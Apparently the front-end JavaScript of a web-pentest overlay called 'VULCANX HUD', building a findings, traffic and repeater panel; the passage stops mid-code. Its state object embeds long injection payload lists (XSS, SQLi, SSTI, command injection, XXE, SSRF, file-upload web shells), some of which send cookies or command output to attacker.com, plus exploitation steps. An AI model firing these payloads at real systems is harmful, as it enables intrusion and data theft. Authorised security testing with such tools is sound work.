
(function() {
    try {
        var w = document.getElementById('vulcanx-widget');
        if (!w) {
            // Create CSS Stylesheet dynamically
            var style = document.createElement('style');
            style.innerHTML = `
                #vulcanx-widget * { box-sizing: border-box; }
                .vx-header { background: #1a1a24; cursor: move; user-select: none; }
                .vx-tab-btn.active { border-bottom: 2px solid #ff0055 !important; color: #ff0055 !important; }
                .vx-table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 11px; }
                .vx-table th, .vx-table td { border: 1px solid #333; padding: 6px 8px; text-align: left; word-break: break-all; }
                .vx-table th { background: #151520; color: #aaa; }
                .vx-table tr:hover { background: rgba(255,255,255,0.03); }
                .vx-finding-details { background: #1c1c28; border-left: 2px solid #ff0055; margin: 5px 0; padding: 10px; font-size: 11px; border-radius: 0 4px 4px 0; }
                .vx-badge { padding: 2px 6px; border-radius: 4px; font-size: 10px; font-weight: bold; }
                .vx-badge-critical { background: #ff0055; color: #fff; }
                .vx-badge-high { background: #ff5500; color: #fff; }
                .vx-badge-medium { background: #ffcc00; color: #000; }
                .vx-badge-low { background: #00ccff; color: #000; }
                .vx-badge-info { background: #888; color: #fff; }
            `;
            document.head.appendChild(style);

            w = document.createElement('div');
            w.id = 'vulcanx-widget';
            w.style.position = 'fixed';
            w.style.bottom = '20px';
            w.style.right = '20px';
            w.style.width = '485px';
            w.style.height = '420px';
            w.style.resize = 'both';
            w.style.overflow = 'hidden';
            w.style.backgroundColor = 'rgba(15, 15, 22, 0.95)';
            w.style.color = '#e2e2e9';
            w.style.border = '1px solid rgba(255, 0, 85, 0.4)';
            w.style.borderRadius = '10px';
            w.style.zIndex = '2147483647';
            w.style.fontFamily = 'monospace';
            w.style.fontSize = '12px';
            w.style.boxShadow = '0 10px 40px rgba(0,0,0,0.5), 0 0 20px rgba(255,0,85,0.15)';
            w.style.display = 'flex';
            w.style.flexDirection = 'column';

            // Drag handler
            var header = document.createElement('div');
            header.className = 'vx-header';
            header.style.display = 'flex';
            header.style.justifyContent = 'space-between';
            header.style.alignItems = 'center';
            header.style.padding = '10px 15px';
            header.style.borderBottom = '1px solid #333';
            
            var title = document.createElement('strong');
            title.innerText = 'VULCANX HUD';
            title.style.color = '#ff0055';
            title.style.letterSpacing = '1px';
            header.appendChild(title);

            var controlGroup = document.createElement('div');
            controlGroup.style.display = 'flex';
            controlGroup.style.alignItems = 'center';

            var minBtn = document.createElement('button');
            minBtn.innerText = '_';
            minBtn.style.background = '#2a2a35';
            minBtn.style.color = '#fff';
            minBtn.style.border = 'none';
            minBtn.style.padding = '3px 8px';
            minBtn.style.borderRadius = '4px';
            minBtn.style.cursor = 'pointer';
            minBtn.onclick = function() {
                var bodyEl = document.getElementById('vulcanx-body');
                if (bodyEl.style.display === 'none') {
                    bodyEl.style.display = 'flex';
                    w.style.height = '420px';
                } else {
                    bodyEl.style.display = 'none';
                    w.style.height = '40px';
                }
            };
            controlGroup.appendChild(minBtn);

            header.appendChild(controlGroup);
            w.appendChild(header);

            // Drag implementation
            var isDragging = false;
            var startX, startY, initialLeft, initialTop;
            header.onmousedown = function(e) {
                if (e.target.tagName === 'BUTTON') return;
                isDragging = true;
                startX = e.clientX;
                startY = e.clientY;
                initialLeft = w.offsetLeft;
                initialTop = w.offsetTop;
                document.onmousemove = function(e) {
                    if (!isDragging) return;
                    var dx = e.clientX - startX;
                    var dy = e.clientY - startY;
                    w.style.left = (initialLeft + dx) + 'px';
                    w.style.top = (initialTop + dy) + 'px';
                    w.style.bottom = 'auto';
                    w.style.right = 'auto';
                };
                document.onmouseup = function() {
                    isDragging = false;
                    document.onmousemove = null;
                };
            };

            // Main body
            var bodyEl = document.createElement('div');
            bodyEl.id = 'vulcanx-body';
            bodyEl.style.flex = '1';
            bodyEl.style.display = 'flex';
            bodyEl.style.flexDirection = 'column';
            bodyEl.style.overflow = 'hidden';

            // Tab bar
            var tabBar = document.createElement('div');
            tabBar.style.display = 'flex';
            tabBar.style.background = '#11111a';
            tabBar.style.borderBottom = '1px solid #222';
            
            var tabs = ['vulnerabilities', 'traffic', 'forms', 'storage', 'map', 'payloads', 'dom', 'scope', 'vpn', 'report'];
            var tabLabels = ['Findings', 'Traffic', 'Forms', 'Storage', 'LinkMap', 'Payloads', 'DOM Sinks', 'Scope', 'VPN', 'Report'];
            tabs.forEach(function(tab, index) {
                var btn = document.createElement('button');
                btn.className = 'vx-tab-btn';
                if (index === 0) btn.className += ' active';
                btn.innerText = tabLabels[index];
                btn.style.flex = '1';
                btn.style.background = 'none';
                btn.style.border = 'none';
                btn.style.color = '#888';
                btn.style.padding = '8px 4px';
                btn.style.cursor = 'pointer';
                btn.style.fontSize = '11px';
                btn.style.fontWeight = 'bold';
                btn.style.textTransform = 'uppercase';
                btn.onclick = function() {
                    Array.from(tabBar.children).forEach(b => b.classList.remove('active'));
                    btn.classList.add('active');
                    window.__vulcanx_state.activeTab = tab;
                    window.__vulcanx_render();
                };
                tabBar.appendChild(btn);
            });
            bodyEl.appendChild(tabBar);

            // Container
            var contentContainer = document.createElement('div');
            contentContainer.id = 'vulcanx-content-pane';
            contentContainer.style.flex = '1';
            contentContainer.style.overflowY = 'auto';
            contentContainer.style.padding = '12px';
            bodyEl.appendChild(contentContainer);

            // Top level tab bar
            var topTabBar = document.createElement('div');
            topTabBar.style.display = 'flex';
            topTabBar.style.borderBottom = '1px solid #333';
            topTabBar.style.backgroundColor = '#141414';

            var tabFindings = document.createElement('div');
            tabFindings.innerText = 'RAW FINDINGS';
            tabFindings.id = 'vulcanx-tab-findings';
            tabFindings.style.padding = '6px 12px';
            tabFindings.style.cursor = 'pointer';
            tabFindings.style.color = '#ff5555';
            tabFindings.style.borderBottom = '2px solid #ff0000';
            tabFindings.style.fontWeight = 'bold';

            var tabSuggest = document.createElement('div');
            tabSuggest.innerText = 'SUGGESTIONS';
            tabSuggest.id = 'vulcanx-tab-suggest';
            tabSuggest.style.padding = '6px 12px';
            tabSuggest.style.cursor = 'pointer';
            tabSuggest.style.color = '#888';
            tabSuggest.style.borderBottom = '2px solid transparent';
            tabSuggest.style.fontWeight = 'bold';

            var suggestList = document.createElement('div');
            suggestList.id = 'vulcanx-suggest-list';
            suggestList.style.flex = '1';
            suggestList.style.overflowY = 'auto';
            suggestList.style.padding = '10px';
            suggestList.style.display = 'none';
            suggestList.style.background = '#0a0a0f';

            function activateTopTab(which) {
                if (which === 'findings') {
                    bodyEl.style.display = 'flex'; suggestList.style.display = 'none';
                    tabFindings.style.color = '#ff5555'; tabFindings.style.borderBottom = '2px solid #ff0000';
                    tabSuggest.style.color = '#888'; tabSuggest.style.borderBottom = '2px solid transparent';
                } else {
                    bodyEl.style.display = 'none'; suggestList.style.display = 'block';
                    tabSuggest.style.color = '#e0b3ff'; tabSuggest.style.borderBottom = '2px solid #aa55ff';
                    tabFindings.style.color = '#888'; tabFindings.style.borderBottom = '2px solid transparent';
                }
            }
            tabFindings.onclick = function() { activateTopTab('findings'); };
            tabSuggest.onclick = function() { activateTopTab('suggest'); };

            topTabBar.appendChild(tabFindings);
            topTabBar.appendChild(tabSuggest);
            w.appendChild(topTabBar);
            
            w.appendChild(bodyEl);
            w.appendChild(suggestList);
            document.body.appendChild(w);

            window.__vulcanx_state = {
                findings: [],
                traffic: [],
                activeTab: 'vulnerabilities',
                highlighting: false,
                domSinks: [],
                scope: [],
                engagementNotes: '',
                payloads: {
                    xss: [
                        "'\",`", "<script>alert(1)</script>", "\"><script>alert(1)</script>", "'><img src=x onerror=alert(1)>",
                        "<svg onload=alert(1)>", "<img src=x onerror=alert(document.cookie)>", "<svg/onload=alert`1`>", "<script>fetch('https://attacker.com?c='+document.cookie)</script>",
                        "<iframe src=javascript:alert(1)>", "<body onload=alert(1)>", "<details open ontoggle=alert(1)>", "<input autofocus onfocus=alert(1)>",
                        "javascript:alert(document.domain)", "<a href=javascript:alert(1)>click</a>", "'-alert(1)-'", "\";alert(1)//",
                        "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>",
                        "<script>document.location='https://attacker.com?c='+document.cookie</script>", "<img src=1 onerror=eval(atob('YWxlcnQoMSk='))>"
                    ],
                    sqli: [
                        "'", "\"", "' OR '1'='1", "' OR 1=1--", "' UNION SELECT null--", "admin'--", "1; DROP TABLE users--", "1' AND SLEEP(5)--",
                        "' AND 1=1--", "' AND 1=2--", "1 OR 1=1", "' OR ''='", "'; EXEC xp_cmdshell('id')--", "1; WAITFOR DELAY '0:0:5'--",
                        "' UNION SELECT username,password FROM users--", "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--", "' ORDER BY 1--", "' GROUP BY 1--", "' HAVING 1=1--"
                    ],
                    ssti: [
                        "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{{7*'7'}}", "{{'7'*7}}",
                        "{{config}}", "{{config.items()}}", "{{''.__class__.__mro__[2].__subclasses__()}}", "{{request.environ}}", "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}",
                        "{%for x in ''.__class__.__mro__[1].__subclasses__()%}{%if x.__name__=='Popen'%}{{x('id',shell=True,stdout=-1).communicate()}}{%endif%}{%endfor%}",
                        "${\"freemarker.template.utility.Execute\"?new()('id')}", "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
                        "@(1+1)", "*{7*7}", "${{7*7}}", "#{7*7}"
                    ],
                    cmdi: [
                        "; id", "| id", "& id", "&& id", "|| id", "`id`", "$(id)", "; whoami",
                        "| whoami", "; cat /etc/passwd", "| cat /etc/passwd", "; ls -la", "\n/usr/bin/id", "\r\n/usr/bin/id",
                        "; ping -c 1 attacker.com", "; curl http://attacker.com/$(whoami)", "$(curl http://attacker.com)", "`curl http://attacker.com`",
                        ";{cat,/etc/passwd}", ";cat${IFS}/etc/passwd", ";c'a't${IFS}/etc/passwd", "%0a/usr/bin/id"
                    ],
                    lfi: [
                        "../etc/passwd", "../../etc/passwd", "../../../etc/passwd", "../../../../etc/passwd",
                        "....//....//etc/passwd", "..%2Fetc%2Fpasswd", "%2e%2e%2fetc%2fpasswd", "..%252f..%252fetc%252fpasswd",
                        "..%c0%afetc%c0%afpasswd", "../etc/passwd%00", "../etc/passwd%00.jpg", "php://filter/convert.base64-encode/resource=index.php",
                        "php://input", "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=", "expect://id", "/proc/self/environ",
                        "/proc/self/cmdline", "/etc/shadow", "/etc/hosts", "C:\\Windows\\win.ini"
                    ],
                    xxe: [
                        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
                        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/\">]><foo>&xxe;</foo>",
                        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\">%dtd;%send;]><foo/>",
                        "<!DOCTYPE test [ <!ENTITY % init SYSTEM \"data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk\"> %init; ]><foo/>",
                        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>",
                        "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>",
                        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>",
                        "<?xml version=\"1.0\" standalone=\"yes\"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\"><text font-size=\"16\" x=\"0\" y=\"16\">&xxe;</text></svg>"
                    ],
                    ssrf: [
                        "http://169.254.169.254/latest/meta-data/", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "http://metadata.google.internal/computeMetadata/v1/", "http://100.100.100.200/latest/meta-data/",
                        "http://127.0.0.1/", "http://localhost/", "http://0.0.0.0/", "http://[::1]/",
                        "http://0177.0.0.1/", "http://0x7f000001/", "http://2130706433/", "http://127.1/",
                        "http://127.0.0.1.nip.io/", "http://localtest.me/", "http://127.0.0.1:22", "http://127.0.0.1:3306",
                        "http://127.0.0.1:5432", "http://127.0.0.1:6379", "http://127.0.0.1:8080", "http://127.0.0.1:9200",
                        "http://127.0.0.1:27017", "dict://127.0.0.1:11211/stat", "file:///etc/passwd", "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a",
                        "ftp://attacker.com/test", "http://attacker.com@127.0.0.1/", "http://127.0.0.1%20@attacker.com/"
                    ],
                    nosqli: [
                        "{\"$gt\": \"\"}", "{\"$ne\": null}", "{\"$regex\": \".*\"}", "{\"$where\": \"1==1\"}",
                        "' || '1'=='1", "'; return true; var a='", "{\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}", "{\"$or\": [{}, {\"a\": \"a\"}]}",
                        "true, $where: '1 == 1'", ", $where: '1 == 1'", "$where: function(){return true}", "{\"$gt\": \"\", \"$lt\": \"z\"}",
                        "[$ne]=1", "[%24ne]=1", "[$regex]=.*", "[%24gt]="
                    ],
                    ldapi: [
                        "*", "*)(uid=*))(|(uid=*", "admin*", "admin)(|(&",
                        ")(|(!(cn=*)))", "*)((|userPassword=*)", "*(|(objectclass=*))", "*)",
                        "*&", ")(|(password=*))(|(uid=*", "*)(|(cn=*)", "*)(uid=*)(|(cn=*",
                        "admin)(&)", "admin)(!(&(1=0)))", "*)(objectClass=*", "\\2a",
                        "\\28\\2a\\29", "\\00"
                    ],
                    open_redirect: [
                        "//attacker.com", "https://attacker.com", "http://attacker.com", "@attacker.com",
                        "https:attacker.com", "http:attacker.com", "/\\attacker.com", "\\\\attacker.com",
                        "/%09/attacker.com", "/%5cattacker.com", "///attacker.com", "////attacker.com",
                        "https://example.com%40attacker.com", "https://attacker.com%23@example.com", "https://example.com.attacker.com", "%2F%2Fattacker.com",
                        "https%3A%2F%2Fattacker.com", "javascript:alert(document.domain)", "data:text/html,<script>alert(1)</script>"
                    ],
                    crlf: [
                        "%0D%0ASet-Cookie:crlf=injection", "%0D%0ALocation:https://attacker.com", "%0D%0A%0D%0A<script>alert(1)</script>", "\\r\\nSet-Cookie:crlf=injection",
                        "%E5%98%8A%E5%98%8DSet-Cookie:crlf=injection", "%250D%250ASet-Cookie:crlf=injection", "%25%30%64%25%30%61Set-Cookie:crlf=injection", "%0aX-Injected:header",
                        "%0dX-Injected:header", "%0d%0aX-Injected:header", "vulcanx\\r\\nX-Injected-Header:value"
                    ],
                    csp_bypass: [
                        "\"><script src=\"https://accounts.google.com/o/oauth2/revoke?callback=alert(1)\"></script>",
                        "\"><script src=\"https://ajax.googleapis.com/ajax/libs/angularjs/1.5.8/angular.min.js\"></script><div ng-app>{{$eval.constructor('alert(1)')()}}</div>",
                        "{{constructor.constructor('alert(1)')()}}", "{{$on.constructor('alert(1)')()}}",
                        "{{a='constructor';b={};b[a]('alert(1)')()}}", "\"><script src=\"data:text/javascript,alert(1)\"></script>",
                        "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></object>", "\"><base href=\"https://attacker.com\">",
                        "\"><script nonce=VULCANX_NONCE>alert(1)</script>", "<svg><foreignObject><body xmlns=\"http://www.w3.org/1999/xhtml\"><script>alert(1)</script></body></foreignObject></svg>",
                        "<link rel=dns-prefetch href=//attacker.com>", "<meta http-equiv=\"refresh\" content=\"0;url=https://attacker.com\">",
                        "eval('alert(1)')", "setTimeout('alert(1)', 500)", "Function('alert(1)')()"
                    ],
                    prototype_pollution: [
                        "__proto__[admin]=true", "__proto__[isAdmin]=true", "constructor[prototype][admin]=true", "__proto__[polluted]=vulcanx",
                        "{\"__proto__\":{\"admin\":true}}", "{\"constructor\":{\"prototype\":{\"admin\":true}}}", "{\"__proto__\":{\"isVip\":true}}", "{\"__proto__\":{\"role\":\"admin\"}}",
                        "?__proto__[admin]=1", "?__proto__.admin=1", "?constructor.prototype.admin=1", "{\"__proto__\":{\"outputFunctionName\":\"x;process.mainModule.require('child_process').execSync('id');x\"}}",
                        "{\"a\":1,\"__proto__\":{\"b\":2}}"
                    ],
                    jwt: [
                        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.", "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.", "eyJhbGciOiJOT05FIn0.eyJyb2xlIjoiYWRtaW4ifQ.", "{\"alg\":\"RS256\",\"jku\":\"https://attacker.com/jwks.json\"}",
                        "{\"alg\":\"RS256\",\"x5u\":\"https://attacker.com/cert.pem\"}", "x' UNION SELECT 'vulcanx_secret'-- -", "../../../dev/null", "../../../../../../etc/passwd",
                        "{\"sub\":\"admin\",\"role\":\"admin\",\"exp\":9999999999}"
                    ],
                    graphql: [
                        "{__schema{types{name}}}", "{__schema{queryType{name},mutationType{name}}}", "{__type(name:\"User\"){fields{name type{name}}}}", "{user(id:\"1 OR 1=1\"){id name email}}",
                        "{user(id:\"1; SLEEP(5)\"){id name}}", "{user(id:1){id name email password}}", "{user(id:2){id name email password}}", "{__type(name:\"Query\"){fields{name args{name}}}}",
                        "{a{a{a{a{a{a{a{a{a{a{id}}}}}}}}}}}", "{u1:user(id:1){id} u2:user(id:2){id} u3:user(id:3){id}}", "mutation{login(username:\"admin' OR 1=1--\",password:\"x\"){token}}"
                    ],
                    path_traversal: [
                        "../", "../../", "../../../../", "../etc/passwd",
                        "../../etc/passwd", "../../../../etc/passwd", "../../etc/passwd%00", "../etc/passwd%00.jpg",
                        "..%2Fetc%2Fpasswd", "..%252Fetc%252Fpasswd", "..%c0%afetc%c0%afpasswd", "\\\\attacker.com\\share",
                        "..\\..\\windows\\win.ini", "..%5C..%5Cwindows%5Cwin.ini", "file.txt/../../../etc/passwd", "./././././././././././././etc/passwd"
                    ],
                    upload_bypass: [
                        "shell.php", "shell.php5", "shell.php7", "shell.phtml",
                        "shell.pht", "shell.shtml", "shell.php.jpg", "shell.jpg.php",
                        "shell.PHP", "shell.PhP", "shell.php.png", "shell.php.gif",
                        "shell.asp;.jpg", "shell.php%00.jpg", "shell.asp%00.jpg", "<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(1)</script></svg>",
                        "<html><script>alert(document.domain)</script></html>", "GIF89a; <?php system($_GET['cmd']); ?>", "shell.asp::$DATA", "../../../etc/cron.d/shell.php",
                        "../../var/www/html/shell.php"
                    ]
                }
            };
        }

        // Functions for rendering and features
        window.__vulcanx_render = function() {
            var container = document.getElementById('vulcanx-content-pane');
            if (!container) return;
            var tab = window.__vulcanx_state.activeTab;

            if (tab === 'vulnerabilities') {

                container.innerHTML = '';
                var findings = window.__vulcanx_state.findings || [];
                
                var topRow = document.createElement('div');
                topRow.style.display = 'flex';
                topRow.style.justifyContent = 'flex-end';
                topRow.style.marginBottom = '10px';
                
                var clearBtn = document.createElement('button');
                clearBtn.innerText = '🗑️ Clear Findings';
                clearBtn.style.background = '#aa0000';
                clearBtn.style.color = '#fff';
                clearBtn.style.border = '1px solid #ff0055';
                clearBtn.style.padding = '5px 10px';
                clearBtn.style.borderRadius = '3px';
                clearBtn.style.cursor = 'pointer';
                clearBtn.onclick = async function() {
                    try { await fetch('/api/clear_findings', {method: 'POST'}); } catch(e) {}
                    window.__vulcanx_state.findings = [];
                    window.__vulcanx_render();
                };
                topRow.appendChild(clearBtn);
                container.appendChild(topRow);

                if (findings.length === 0) {
                    var emptyDiv = document.createElement('div');
                    emptyDiv.style.color = '#666';
                    emptyDiv.style.textAlign = 'center';
                    emptyDiv.style.marginTop = '50px';
                    emptyDiv.innerText = 'No vulnerabilities detected yet.';
                    container.appendChild(emptyDiv);
                    return;
                }

                // Helper to extract domain from URL
                function getDomain(urlStr) {
                    try {
                        // Handle relative URLs or just paths just in case
                        if (!urlStr.startsWith('http')) {
                            // If there's no http/https, try to prepend it or just return 'Unknown'
                            // Usually f.url is absolute in the scanner.
                            urlStr = 'http://' + urlStr;
                        }
                        var url = new URL(urlStr);
                        return url.hostname;
                    } catch(e) {
                        return 'Unknown Domain';
                    }
                }

                // Group by domain, then by type
                var domainGroups = {};
                findings.forEach(f => {
                    var domain = getDomain(f.url);
                    var type = f.type || 'UNKNOWN';
                    
                    if (!domainGroups[domain]) domainGroups[domain] = {};
                    if (!domainGroups[domain][type]) domainGroups[domain][type] = [];
                    
                    domainGroups[domain][type].push(f);
                });

                Object.keys(domainGroups).forEach(domain => {
                    var domainDetails = document.createElement('details');
                    domainDetails.style.marginBottom = '15px';
                    domainDetails.style.border = '1px solid #335577';
                    domainDetails.style.borderRadius = '5px';
                    domainDetails.style.background = 'rgba(10,20,30,0.5)';
                    domainDetails.open = true;

                    var domainTotal = 0;
                    Object.values(domainGroups[domain]).forEach(list => { domainTotal += list.length; });

                    var domainSummary = document.createElement('summary');
                    domainSummary.style.cursor = 'pointer';
                    domainSummary.style.padding = '8px';
                    domainSummary.style.fontWeight = 'bold';
                    domainSummary.style.outline = 'none';
                    domainSummary.style.backgroundColor = '#112233';
                    domainSummary.style.borderBottom = '1px solid #335577';
                    domainSummary.innerHTML = `🌍 <span style="color:#4da6ff; font-size:13px;">${domain}</span> <span style="color:#aaa; font-size:11px;">(${domainTotal} findings)</span>`;
                    domainDetails.appendChild(domainSummary);

                    var domainContent = document.createElement('div');
                    domainContent.style.padding = '10px';

                    var groups = domainGroups[domain];
                    Object.keys(groups).forEach(type => {
                        var list = groups[type];
                        var first = list[0];
                        var severity = first.severity || 'INFO';
                        var badgeClass = 'vx-badge vx-badge-' + severity.toLowerCase();
                        
                        var details = document.createElement('details');
                        details.style.marginBottom = '10px';
                        details.style.borderBottom = '1px solid #222';
                        details.style.paddingBottom = '8px';

                        var stateKey = domain + '_' + type;
                        if (window.__vx_open_details && window.__vx_open_details[stateKey]) {
                            details.open = true;
                        }
                        details.addEventListener('toggle', function() {
                            window.__vx_open_details = window.__vx_open_details || {};
                            window.__vx_open_details[stateKey] = details.open;
                        });

                        var summary = document.createElement('summary');
                        summary.style.cursor = 'pointer';
                        summary.style.fontWeight = 'bold';
                        summary.style.outline = 'none';
                        summary.innerHTML = `<span class="${badgeClass}">${severity}</span> <span style="margin-left:5px; color:#fff;">${type}</span> <span style="color:#666;font-size:10px;">(${list.length})</span>`;
                        details.appendChild(summary);

                        var descDiv = document.createElement('div');
                        descDiv.className = 'vx-finding-details';
                        
                        var remediation = first.remediation || 'Review and secure this resource.';
                        var description = first.description || 'Vulnerability detected.';
                        
                        var exploitSteps = "Manual exploitation steps not explicitly defined for this vulnerability class. Review documentation for standard attack vectors.";
                        var t = type.toUpperCase();
                        if (t.includes('XSS') || t.includes('DOM_XSS')) {
                            exploitSteps = "1. Identify the exact reflection point in the DOM or Response.\\n2. Inject a benign HTML payload (e.g., `<u>test</u>`).\\n3. Verify if the payload is rendered without HTML encoding.\\n4. Inject an active execution payload (e.g., `<script>alert(document.domain)</script>`).\\n5. If blocked, attempt standard WAF bypasses (e.g., `<img src=x onerror=alert(1)>`).";
                        } else if (t.includes('SQL') || t.includes('INJECTION')) {
                            exploitSteps = "1. Identify the susceptible input parameter.\\n2. Inject standard syntax breakers (e.g., `'`, `\"`, `;`).\\n3. Monitor the response for raw database errors.\\n4. Proceed with Boolean logic testing (e.g., `' OR 1=1--`).\\n5. Attempt Time-Based inference (e.g., `WAITFOR DELAY '0:0:5'`).";
                        } else if (t.includes('CORS')) {
                            exploitSteps = "1. Confirm if the server reflects an arbitrary `Origin` header.\\n2. Verify if `Access-Control-Allow-Credentials` is set to `true`.\\n3. Craft an exploit page with JavaScript to send cross-origin requests.\\n4. Phish an authenticated victim to visit the exploit page to exfiltrate their data.";
                        } else if (t.includes('SINK') || t.includes('RUNTIME')) {
                            exploitSteps = "1. Trace the input source (URL, hash, storage) reaching the sink.\\n2. Determine the execution context (e.g., inside a JS string, HTML context).\\n3. Craft a payload to break out of the context (e.g., `\");alert(1);//`).\\n4. Deliver the payload to execute arbitrary code.";
                        } else if (t.includes('SECRET') || t.includes('KEY') || t.includes('TOKEN')) {
                            exploitSteps = "1. Extract the disclosed secret from the application response.\\n2. Identify the target service (AWS, Stripe, Internal API).\\n3. Utilize the secret to attempt unauthorized API access or privilege escalation.";
                        } else if (t.includes('COOKIE') || t.includes('INSECURE')) {
                            exploitSteps = "1. (Missing HttpOnly) Attempt to steal the session cookie via XSS using `document.cookie`.\\n2. (Missing Secure) Attempt a Man-in-the-Middle (MitM) attack to capture the cookie over cleartext HTTP.\\n3. (Missing SameSite) Attempt Cross-Site Request Forgery (CSRF).";
                        }

                        var exploitHTML = `<div style="color:#aa55ff;margin-bottom:10px;font-size:11px;"><strong>🛡️ Exploitation Steps:</strong><br>${exploitSteps.replace(/\\n/g, '<br>')}</div>`;

                        descDiv.innerHTML = `<div style="color:#ffcc00;margin-bottom:6px;">💡 ${description}</div>
                                             <div style="color:#aaa;margin-bottom:10px;font-style:italic;">Remediation: ${remediation}</div>
                                             ${exploitHTML}`;

                        list.forEach(f => {
                            var item = document.createElement('div');
                            item.style.marginBottom = '6px';
                            var method = f.method || '';
                            var status = f.status_code || '';
                            var meta = (method || status) ? `[${method} ${status}] ` : '';
                            var match = f.match || '';
                            if (match.length > 1500) match = match.substring(0, 1500) + '... [TRUNCATED]';
                            
                            var safeMatch = match.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
                            var matchHTML = match ? `<br><span style="color:#888;">Match: <code style="color:#ccc;white-space:pre-wrap;display:block;padding:4px;background:#222;border:1px solid #333;margin-top:2px;">${safeMatch}</code></span>` : '';
                            
                            // Highlight the path instead of full URL for cleaner display
                            var displayUrl = f.url;
                            try {
                                var u = new URL(f.url);
                                displayUrl = u.pathname + u.search + u.hash;
                                if (displayUrl === '') displayUrl = '/';
                            } catch(e) {}

                            item.innerHTML = `<strong style="color:#ff0055;font-size:10px;">${meta}</strong><span style="color:#4da6ff;word-break:break-all;">${displayUrl}</span>${matchHTML}`;
                            descDiv.appendChild(item);
                        });

                        details.appendChild(descDiv);
                        domainContent.appendChild(details);
                    });
                    
                    domainDetails.appendChild(domainContent);
                    container.appendChild(domainDetails);
                });
} else if (tab === 'traffic') {

container.innerHTML = '';
                var traffic = window.__vulcanx_state.traffic || [];
                
                var topRow = document.createElement('div');
                topRow.style.display = 'flex';
                topRow.style.justifyContent = 'flex-end';
                topRow.style.marginBottom = '10px';
                
                var clearBtn = document.createElement('button');
                clearBtn.innerText = '🗑️ Clear History';
                clearBtn.style.background = '#aa0000';
                clearBtn.style.color = '#fff';
                clearBtn.style.border = '1px solid #ff0055';
                clearBtn.style.padding = '5px 10px';
                clearBtn.style.borderRadius = '3px';
                clearBtn.style.cursor = 'pointer';
                clearBtn.onclick = async function() {
                    try { await fetch('/api/clear_traffic', {method: 'POST'}); } catch(e) {}
                    window.__vulcanx_state.traffic = [];
                    window.__vulcanx_render();
                };
                topRow.appendChild(clearBtn);
                container.appendChild(topRow);

                // Add Repeater Section at the top
                var repeaterDiv = document.createElement('div');
                repeaterDiv.id = 'vx-repeater';
                repeaterDiv.style.display = 'none';
                repeaterDiv.style.marginBottom = '15px';
                repeaterDiv.style.padding = '10px';
                repeaterDiv.style.background = '#1a1a24';
                repeaterDiv.style.border = '1px solid #ff0055';
                repeaterDiv.style.borderRadius = '5px';
                
                var repeaterHeader = document.createElement('div');
                repeaterHeader.style.display = 'flex';
                repeaterHeader.style.justifyContent = 'space-between';
                repeaterHeader.style.marginBottom = '8px';
                repeaterHeader.innerHTML = '<strong style="color:#ff0055;">Repeater</strong> <button id="vx-close-repeater" style="background:none;border:none;color:#fff;cursor:pointer;">X</button>';
                repeaterDiv.appendChild(repeaterHeader);
                
                var repeaterMethodUrl = document.createElement('div');
                repeaterMethodUrl.style.display = 'flex';
                repeaterMethodUrl.style.marginBottom = '8px';
                
                var methodSelect = document.createElement('select');
                ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'].forEach(m => {
                    var opt = document.createElement('option');
                    opt.value = m;
                    opt.innerText = m;
                    methodSelect.appendChild(opt);
                });
                methodSelect.style.background = '#222';
                methodSelect.style.color = '#fff';
                methodSelect.style.border = '1px solid #444';
                methodSelect.style.marginRight = '4px';
                methodSelect.id = 'vx-rep-method';
                
                var urlInput = document.createElement('input');
                urlInput.type = 'text';
                urlInput.id = 'vx-rep-url';
                urlInput.style.flex = '1';
                urlInput.style.background = '#222';
                urlInput.style.color = '#fff';
                urlInput.style.border = '1px solid #444';
                
                repeaterMethodUrl.appendChild(methodSelect);
                repeaterMethodUrl.appendChild(urlInput);
                repeaterDiv.appendChild(repeaterMethodUrl);
                
                var headersLabel = document.createElement('div');
                headersLabel.innerText = 'Headers (JSON):';
                headersLabel.style.fontSize = '10px';
                headersLabel.style.color = '#aaa';
                repeaterDiv.appendChild(headersLabel);
                
                var headersInput = document.createElement('textarea');
                headersInput.id = 'vx-rep-headers';
                headersInput.style.width = '100%';
                headersInput.style.height = '60px';
                headersInput.style.background = '#222';
                headersInput.style.color = '#fff';
                headersInput.style.border = '1px solid #444';
                headersInput.style.marginBottom = '8px';
                headersInput.style.fontFamily = 'monospace';
                headersInput.style.fontSize = '10px';
                repeaterDiv.appendChild(headersInput);
                
                var bodyLabel = document.createElement('div');
